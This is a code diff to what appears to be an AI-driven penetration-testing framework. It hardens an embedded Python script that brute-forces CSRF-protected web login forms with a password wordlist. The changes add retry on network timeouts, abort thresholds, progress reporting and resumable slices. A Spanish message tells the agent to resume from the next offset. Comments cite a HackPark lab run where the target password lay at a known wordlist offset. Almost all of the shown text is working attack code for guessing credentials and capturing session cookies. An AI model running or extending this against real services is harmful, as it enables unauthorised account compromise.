@@ -669,8 +669,12 @@ except Exception as exc:
 #: the viewstate (and often the session) to the GET that issued it, and parallel
 #: attempts with a shared cookie jar would invalidate each other's tokens.
 CRED_CSRF_SCRIPT = r'''
-import json, sys, time, urllib.error, urllib.parse, urllib.request
+import http.client, json, sys, time, urllib.error, urllib.parse, urllib.request
 from html.parser import HTMLParser
+
+# Progress shared with the top-level handler so an unexpected abort can still
+# report how much of the slice was really tested (R4).
+_PROGRESS = {"tested": 0, "request_timeouts": 0, "started": 0.0}
 
 class _NoRedirect(urllib.request.HTTPRedirectHandler):
     allow_same_origin = False
@@ -757,6 +761,21 @@ def attempt(form_url, method, action_url, template, username, password, timeout,
         status = landed_status
     return status, text, hidden
 
+#: Consecutive request failures after which the sweep stops instead of walking
+#: the rest of a wordlist against a target that is not answering.
+MAX_CONSECUTIVE_REQUEST_TIMEOUTS = 10
+#: Retries of one *entry* whose request was cut. One slow or reset connection is
+#: not evidence about the password, so the same password is tried again before it
+#: counts as lost (V12 lost the whole slice to a single timeout).
+REQUEST_RETRIES = 1
+
+def _write(path, payload):
+    try:
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(json.dumps(payload) + "\n")
+    except OSError:
+        pass
+
 def main():
     (mode, form_url, method, action_url, template, failure, username, wordlist,
      budget, success_marker, progress_path, result_path) = sys.argv[1:13]
@@ -775,67 +794,111 @@ def main():
             "failure_status": status,
             "in_baseline": failure in baseline,
             "in_failure": failure in text,
+            # The sweep needs fresh ``__VIEWSTATE``/CSRF values per attempt; the
+            # probe is the one place that can say whether the page issues them.
+            # Without this the handler could not tell "no tokens" from "the
+            # client did not look" (V12, HackPark).
+            "hidden_fields": [name for name, _ in hidden_fields(baseline)],
         }))
         return
 
     started = time.time()
+    _PROGRESS["started"] = started
     deadline = started + budget
     with open(wordlist, encoding="utf-8", errors="replace") as handle:
         passwords = [line.rstrip("\r\n") for line in handle if line.strip()]
     total = len(passwords)
     tested = 0
+    request_timeouts = 0
+    consecutive_timeouts = 0
+    last_error = ""
     for password in passwords:
         if time.time() >= deadline:
-            print(json.dumps({
+            payload = {
                 "ok": True, "timed_out": True, "tested": tested, "total": total,
-                "password": None,
-            }))
+                "password": None, "request_timeouts": request_timeouts,
+                "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
+            }
+            _write(result_path, payload)
+            print(json.dumps(payload))
             return
-        status, text, hidden = attempt(
-            form_url, method, action_url, template, username, password, per_request, jar
-        )
+        outcome = None
+        last_exc = None
+        for _retry in range(REQUEST_RETRIES + 1):
+            try:
+                outcome = attempt(
+                    form_url, method, action_url, template, username, password, per_request, jar
+                )
+                break
+            except (urllib.error.URLError, http.client.HTTPException, OSError) as exc:
+                last_exc = exc
+        if outcome is None:
+            # R4: one slow or reset request is not the end of the sweep. Measured
+            # in HackPark V12 (2026-10-21): a single ``URLError: timed out``
+            # aborted the whole 5 000-password slice after 75 attempts (55 s) and
+            # the run was told ``unavailable`` -the 4 925 remaining passwords,
+            # including the room's own at offset 1 420, were never tried.
+            request_timeouts += 1
+            _PROGRESS["request_timeouts"] = request_timeouts
+            consecutive_timeouts += 1
+            last_error = type(last_exc).__name__ + ": " + str(last_exc)[:200]
+            if consecutive_timeouts >= MAX_CONSECUTIVE_REQUEST_TIMEOUTS:
+                payload = {
+                    "ok": False, "tested": tested, "total": total,
+                    "request_timeouts": request_timeouts,
+                    "aborted": "consecutive_request_timeouts",
+                    "error": last_error,
+                    "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
+                }
+                _write(result_path, payload)
+                print(json.dumps(payload))
+                return
+            continue
+        status, text, hidden = outcome
+        consecutive_timeouts = 0
         tested += 1
+        _PROGRESS["tested"] = tested
         success = failure not in text
         if success and success_marker:
             success = success_marker in text
         if tested % 25 == 0:
-            try:
-                with open(progress_path, "w", encoding="utf-8") as handle:
-                    handle.write(json.dumps({
-                        "tested": tested, "total": total,
-                        "elapsed_seconds": round(time.time() - started, 1),
-                    }) + "\n")
-            except OSError:
-                pass
+            _write(progress_path, {
+                "tested": tested, "total": total, "request_timeouts": request_timeouts,
+                "elapsed_seconds": round(time.time() - started, 1),
+            })
         if success:
             payload = {
                 "ok": True, "timed_out": False, "tested": tested, "total": total,
                 "password": password, "status": status,
+                "request_timeouts": request_timeouts,
+                "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
                 "fields": [name for name, value in hidden],
                 "set_cookie": ["%s=%s" % item for item in jar.items()],
             }
-            try:
-                with open(result_path, "w", encoding="utf-8") as handle:
-                    handle.write(json.dumps(payload) + "\n")
-            except OSError:
-                pass
+            _write(result_path, payload)
             print(json.dumps(payload))
             return
     payload = {
         "ok": True, "timed_out": False, "tested": tested, "total": total,
-        "password": None, "elapsed_seconds": round(time.time() - started, 1),
+        "password": None, "request_timeouts": request_timeouts,
+        "attempts_per_second": round(tested / max(0.001, time.time() - started), 3),
+        "elapsed_seconds": round(time.time() - started, 1),
     }
-    try:
-        with open(result_path, "w", encoding="utf-8") as handle:
-            handle.write(json.dumps(payload) + "\n")
-    except OSError:
-        pass
+    _write(result_path, payload)
     print(json.dumps(payload))
 
 try:
     main()
 except Exception as exc:
-    print(json.dumps({"ok": False, "error": type(exc).__name__ + ": " + str(exc)[:200]}))
+    # Never answer with a bare error: the caller needs ``tested`` to tell a slice
+    # that proved nothing (``unavailable``) from one that did run and was cut
+    # short (``partial``).
+    print(json.dumps({
+        "ok": False,
+        "error": type(exc).__name__ + ": " + str(exc)[:200],
+        "tested": _PROGRESS["tested"],
+        "request_timeouts": _PROGRESS["request_timeouts"],
+    }))
 '''
 
 
@@ -1096,7 +1159,10 @@ async def _csrf_form_observation(
     if payload is None:
         return None, "csrf_client_did_not_answer"
     if not payload.get("ok"):
-        return None, str(payload.get("error") or "csrf_client_failed")[:200]
+        # R4: an aborted client is only ``unavailable`` when it tested nothing.
+        # A payload with ``tested > 0`` is a slice that ran and was cut short,
+        # and the caller decides between ``partial`` and ``unavailable``.
+        return payload, str(payload.get("error") or "csrf_client_failed")[:200]
     return payload, ""
 
 
@@ -1122,7 +1188,10 @@ async def _probe_csrf_form_login(
         budget_seconds=CRED_PROBE_TIMEOUT_SECONDS,
         workspace_root=workspace_root,
     )
-    if payload is None:
+    # A probe that could not run is ``skipped`` (it never blocks the sweep); only
+    # a real answer says anything about the marker. ``ok=false`` is an
+    # infrastructure failure, not a verdict about the login page.
+    if payload is None or not payload.get("ok"):
         return _ProbeVerdict("skipped", reason)
     return _probe_verdict(payload)
 
@@ -1184,7 +1253,18 @@ async def _csrf_form_sweep(
     if probe.reason:
         evidence["failure_string_probe_reason"] = probe.reason
 
-    if payload is None:
+    tested = int((payload or {}).get("tested") or 0)
+    request_timeouts = int((payload or {}).get("request_timeouts") or 0)
+    attempts_per_second = float((payload or {}).get("attempts_per_second") or 0.0)
+    evidence.update({
+        "tested": tested,
+        "request_timeouts": request_timeouts,
+        "attempts_per_second": attempts_per_second,
+    })
+    if payload is None or (not payload.get("ok") and tested <= 0):
+        # Only a client that never tested anything is ``unavailable``: the
+        # backend did not serve the call, and the loop must not read it as a
+        # verdict about the target (R4).
         return ToolResult(
             output={
                 "error": "the CSRF form client did not answer",
@@ -1192,19 +1272,52 @@ async def _csrf_form_sweep(
                 "target": target,
                 "service": service,
                 "port": port,
+                "tested": tested,
+                "request_timeouts": request_timeouts,
             },
             verified=False,
             outcome="unavailable",
             verification_method="cred_bruteforce_csrf_failed",
             evidence=evidence,
         )
+    if not payload.get("ok"):
+        # The slice ran and was cut short (the client hit its per-request
+        # failure cap or raised): nothing was proven, but the passwords it did
+        # try are spent. ``partial`` + ``next_start_at`` lets the model resume
+        # instead of concluding "brute force does not work here" (HackPark V12:
+        # one URLError at 75/5 000 became ``unavailable``).
+        next_start_at = start_at + tested
+        return ToolResult(
+            output={
+                "error": "the CSRF form client aborted mid-slice",
+                "reason": reason,
+                "aborted": str(payload.get("aborted") or "client_error"),
+                "tested": tested,
+                "request_timeouts": request_timeouts,
+                "attempts_per_second": attempts_per_second,
+                "next_start_at": next_start_at,
+                "message": (
+                    f"El barrido con CSRF se cortó tras {tested} intentos "
+                    f"({request_timeouts} fallos de red) sin credencial válida. "
+                    "NO es un veredicto sobre el objetivo ni sobre la contraseña: "
+                    f"repite con start_at={next_start_at} para el siguiente slice."
+                ),
+                "target": target,
+                "service": service,
+                "port": port,
+                "attempts": attempts,
+            },
+            verified=False,
+            outcome="partial",
+            verification_method="cred_bruteforce_csrf_aborted",
+            evidence=evidence,
+            stdout=payload.get("error"),
+        )
 
-    tested = int(payload.get("tested") or 0)
     timed_out = bool(payload.get("timed_out"))
     password = str(payload.get("password") or "")
     fields = [str(name) for name in (payload.get("fields") or [])]
     evidence.update({
-        "tested": tested,
         "next_start_at": start_at + tested,
         "wordlist_completed": (exhausted and not timed_out and tested >= attempts),
         "found_count": 1 if password else 0,
@@ -1228,6 +1341,9 @@ async def _csrf_form_sweep(
                 "port": port,
                 "attempts": attempts,
                 "tested": tested,
+                "request_timeouts": request_timeouts,
+                "attempts_per_second": attempts_per_second,
+                "next_start_at": start_at + tested,
             },
             verified=False,
             outcome="timeout",
@@ -1272,8 +1388,12 @@ async def _csrf_form_sweep(
                 "status": payload.get("status"),
             }
 
-    partial = not stored and not timed_out and not exhausted
-    negative = not stored and not timed_out and exhausted
+    # A slice is only a *verdict* when every entry in it was really tested. A
+    # lost entry (request cut twice) leaves ``tested < attempts``: the sweep is
+    # then ``partial`` and resumable, never a `negative` that closes the branch.
+    completed_slice = bool(exhausted and tested >= attempts)
+    partial = not stored and not timed_out and not completed_slice
+    negative = not stored and not timed_out and completed_slice
     if negative:
         _record_brute_barrier(
             context,
@@ -1411,7 +1531,14 @@ def _record_brute_barrier(
             engagement_id=engagement_id,
             fact_type="barrier",
             key=f"{target}:{port}",
-            value={"reason": reason, **(detail or {})},
+            # R6: this barrier carries the provenance the ledger needs to close
+            # the branch -the sweep really ran to the end of the wordlist.
+            value={
+                "reason": reason,
+                "sweep_attempted": True,
+                "outcome": "negative",
+                **(detail or {}),
+            },
             source="nexus.cred.bruteforce",
             created_by="nexus.cred.bruteforce",
             verified=False,
